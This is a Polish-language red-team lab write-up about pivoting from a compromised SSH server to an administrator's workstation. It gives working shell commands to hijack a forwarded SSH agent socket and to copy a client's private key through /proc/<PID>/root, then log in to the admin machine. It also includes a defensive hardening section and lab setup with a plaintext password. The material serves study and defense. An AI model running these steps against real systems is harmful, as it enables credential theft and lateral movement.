# Admin SSH to infected machine? His computer gone.

**Technika:** pivot z **skompromitowanego serwera** na **stację administratora**, który sam wszedł `ssh` (klucz lub agent).

**MITRE ATT&CK (skrót):**

| ID | Nazwa | Rola w scenariuszu |
|----|--------|---------------------|
| T1078 | Valid Accounts | Admin loguje się na legacy / zakazany host |
| T1021.004 | Remote Services: SSH | Pivot z powrotem na laptop admina |
| T1552.006 | Unsecured Credentials: SSH Agent | Admin użył `ssh -A` |
| T1552.004 | Unsecured Credentials: Private Key | Klucz z procesu klienta (`/proc/PID/root`) |

---

## TL;DR

> Admin łączy się na **twój** (zainfekowany) host. **Nie** dostajesz automatycznie revshella — dostajesz **sesję u siebie** albo **agent/klucz**, jeśli źle skonfigurował klienta.

| Błąd admina | Co robisz (root na zainfekowanym hoście) | Efekt |
|-------------|------------------------------------------|--------|
| `ssh -A` na zły serwer | Przejmujesz `SSH_AUTH_SOCK` sesji → `ssh admin@<jego_IP>` | Wejście na **jego PC** bez pliku `.pem` |
| `ssh -i klucz` (bez `-A`), klient na **tym samym** hypervisorze | `/proc/<pid_ssh>/root/.../id_*` → kopia klucza → SSH na jego stację | To samo |
| Tylko klucz, klient **tylko** u niego zdalnie | Zwykle **brak** klucza na serwerze — pivot wymaga **innego** wektora | Edukacja OPSEC |

**„His computer gone”** = masz **shell/SSH na stacji admina**, nie że RDP/SSH magicznie „odbija” samo.

---

## Scenariusz (lab)

```
[Admin laptop]  --ssh-->  [Infected / forbidden host :2221 user legacy]
       ^                           |
       |                           | root: kradzież agenta LUB /proc/pid/root
       +-------- ssh admin@admin-pc:22 ----------+
```

- **Admin laptop:** Docker `admin-workstation` (Debian, `sshd :22`, user `admin`).
- **Infected host:** Kali, drugi `sshd` na `:2221`, user `legacy`.
- Lokalny lab: `~/Desktop/htb/ttp-docker-ssh-lab/`.

---

## Wektor A — SSH agent forwarding (`ssh -A`)

### Warunek

Admin: `ssh -A -i key legacy@infected:2221` (albo `ForwardAgent yes` w `~/.ssh/config`).

### Mechanizm

1. Agent z laptopa jest **przekazany** do sesji na `legacy`.
2. Socket: `/home/legacy/.ssh/agent/*` lub `SSH_AUTH_SOCK` w `/proc/<pid>/environ`.
3. **Root** nie może użyć cudzego socketu jako root — użyj **`runuser -u legacy`**:

```bash
AUTH_SOCK=$(find /home/legacy/.ssh/agent -maxdepth 1 -type s 2>/dev/null | head -1)
runuser -u legacy -- env SSH_AUTH_SOCK="$AUTH_SOCK" \
  ssh -o IdentityAgent="$AUTH_SOCK" -o PreferredAuthentications=publickey \
  -o BatchMode=yes -o StrictHostKeyChecking=no \
  admin@<ADMIN_IP> 'id; hostname'
```

### Skrypt

```bash
./ssh-infected-admin-pivot/pivot_agent_to_admin.sh <ADMIN_IP>
```

---

## Wektor B — klucz z procesu klienta (`ssh -a`, bez agenta)

### Warunek

- Admin **nie** używa `-A`.
- Proces **`ssh` klienta** działa na **tym samym hoście** co ty (VM / Docker na hypervisorze).

### Mechanizm

Linux: `/proc/<PID>/root` = widok rootfs procesu (kontener admina).

```bash
PID=$(pgrep -f 'ssh.*2221.*legacy@' | head -1)
KEY="/proc/${PID}/root/root/.ssh/admin_laptop_key"   # ścieżka z labu
cp "$KEY" /tmp/stolen && chmod 600 /tmp/stolen
ssh -i /tmp/stolen -o StrictHostKeyChecking=no admin@<ADMIN_IP> id
```

### Skrypt

```bash
sudo ./ssh-infected-admin-pivot/pivot_proc_root_key.sh <ADMIN_IP>
```

---

## Co **nie** działa (mit)

| Mit | Rzeczywistość |
|-----|----------------|
| „Połączył się kluczem → mam revshell na jego PC” | Klucz **publiczny** jest u ciebie; **prywatny** zostaje u niego (chyba że agent / proc / wyciek pliku). |
| „Mam root na serwerze → czytam jego klucz z sshd” | `sshd` **nie trzyma** prywatnego klucza klienta. |
| „Reverse shell back” przy samym SSH | Revshell = **on wykonuje** kod u siebie lub ty masz **pivot SSH**, nie to samo. |

---

## Obrona (dla blue / admina)

- **Wyłącz** `ForwardAgent` domyślnie (`-a`, `AllowAgentForwarding no` na serwerach zewnętrznych).
- **Osobne klucze** na jump / legacy — nie ten sam na laptop i produkcję.
- **Zakaz** logowania adminów na nieautoryzowane legacy bez bastionu.
- **Brak** współhostowania wrażliwych klientów SSH z untrusted workload (proc/root).
- **Hardware token** / klucze z **destination constraint** (nowsze OpenSSH).

---

## Lab — szybki start

```bash
# Kali (root): user legacy :2221 — setup_kali_user.sh w ttp-docker-ssh-lab
echo 'wasd' | su -c 'bash ~/Desktop/htb/ttp-docker-ssh-lab/setup_kali_user.sh'
docker start admin-workstation   # lub run z ACCESS w ttp-docker-ssh-lab
```

Dowód: `cat ~/FLAG.txt` na stacji `admin` → `LAB{pivot_admin_workstation}`.

---

## Autor

DonMorpheus — materiał z labu TTP na Kali (2026).  
Repozytorium: `red-team-scripts/` w [DonMorpheus/ctf-toolkit](https://github.com/DonMorpheus/ctf-toolkit).